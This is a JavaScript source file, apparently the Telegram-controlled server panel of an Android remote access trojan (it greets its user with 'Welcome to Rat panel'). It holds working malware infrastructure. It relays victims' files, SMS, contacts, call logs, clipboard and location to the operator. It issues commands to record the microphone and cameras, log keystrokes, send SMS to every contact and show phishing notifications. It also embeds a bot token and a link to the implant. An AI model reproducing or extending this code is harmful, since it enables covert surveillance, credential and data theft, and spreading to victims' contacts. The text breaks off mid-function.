const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = "7843013455:AAHoxAjuDvqqithc92FHEheSy4rmnlIOeX8";
const id = "927899812";
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer({ dest: 'uploadedFile/' });
const fs = require('fs');

app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.get('/getFile/*', function (req, res) {
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if(err == null) {
      res.sendFile(filePath)
    } else if (err.code === 'ENONET') {
      res.send(`<h1>File not exist</h1>`)
    } else {
      res.send(`<h1>Error, not found</h1>`)
    }
  });
})

app.get('/deleteFile/*', function (req, res) {
  const fileName = req.params[0]
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if (err == null) {
      fs.unlink(filePath, (err) => {
        if (err) {
          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
        } else {
          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
        }
      });
    } else if (err.code === 'ENOENT') {
      // file does not exist
      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
    } else {
      res.send('<h1>Some other error: </h1>', err.code)
    }
  });
})



app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    const file_name = req.file.filename
    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
    const host_url = req.protocol + '://' + req.get('host')
    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
      if ( err ) console.log('ERROR: ' + err);
    });
    appBot.sendMessage(id, `°• رساله من <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
/*
   {
     parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
           [{text: 'حذف الملف', callback_data: `delete_file:${name}`}]
         ]}
   }, 
   */
{parse_mode: "HTML", disable_web_page_preview: true})
   res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رساله من <b>${req.headers.model}</b> جهاز\n\n` + req.body['text'],
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML", disable_web_page_preview: true})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• اتصال جهاز جديد\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• قطع الاتصال مع الجهاز\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }

        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`open_target_link:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠')) {
            const message_to_tts = message.text
            const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' + encodeURIComponent(message_to_tts)
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`text_to_speech:${message_tts_link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }



        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡',
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    "reply_markup": {
                        "keyboard": [["اجهزة متصله"], ["قائمة الاوامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'اجهزه متصله') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• ليس هناك جهاز متصل يا ابو رسلان\n\n' +
                    '• تاكد من تنزيل bit.ly/Omre1212'
                )
            } else {
                let text = '°• قائمة الاجهزه المتصله :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'ارسال اوامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لم يتم اتصال اي جهاز\n\n' +
                    '• تاكد من تنزيل bit.ly/Omre1212'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• اختار الجهاز لارسال الاوامر', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• ليس هنالك صلاحيات')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• اختر امر للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'تطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'ملف من الهاتف', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'الحافضه', callback_data: `clipboard:${uuid}`},
                        {text: 'تسجيل مايكروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'كاميرا رئسيه', callback_data: `camera_main:${uuid}`},
                        {text: 'كاميرا اماميه', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'تسجيل الكاميرا الخلفيه', callback_data: `rec_camera_main:${uuid}`},
                        {text: 'تسجيل الكاميرا الاماميه', callback_data: `rec_camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'الاتصالات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'رج الهاتف', callback_data: `vibrate:${uuid}`},
                        {text: 'ارسال اشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'رسائل', callback_data: `messages:${uuid}`},
                        {text: 'ارسل رساله', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'تشغيل صوت', callback_data: `play_audio:${uuid}`},
                        {text: 'ايقاف الصوت', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {text: '🔥', callback_data: `my_fire_emoji:${uuid}`},
                        {text: 'صورة لشاشه', callback_data: `screenshot:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل المس', callback_data: `torch_on:${uuid}`},
                        {text: 'تعطيل المس', callback_data: `torch_off:${uuid}`},
                    ],
                    [
                        {text: 'تسجيل الازرار', callback_data: `keylogger_on:${uuid}`},
                        {text: 'ايقاف تتبع الازرار', callback_data: `keylogger_off:${uuid}`},
                    ],
                    [
                        {text: 'فتح رابط', callback_data: `open_target_link:${uuid}`},
                        {text: 'تحويل النص الى صوت', callback_data: `text_to_speech:${uuid}`},
                    ],
                    [
                        {
                            text: 'ارسل رساله الى جميع جهات الاتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        },
                    ],
                    [
                        {
                            text: 'ازرار الهاتف',
                            callback_data: `device_button:${uuid}`
                        },
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ𝙨\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '•  سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '•  سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
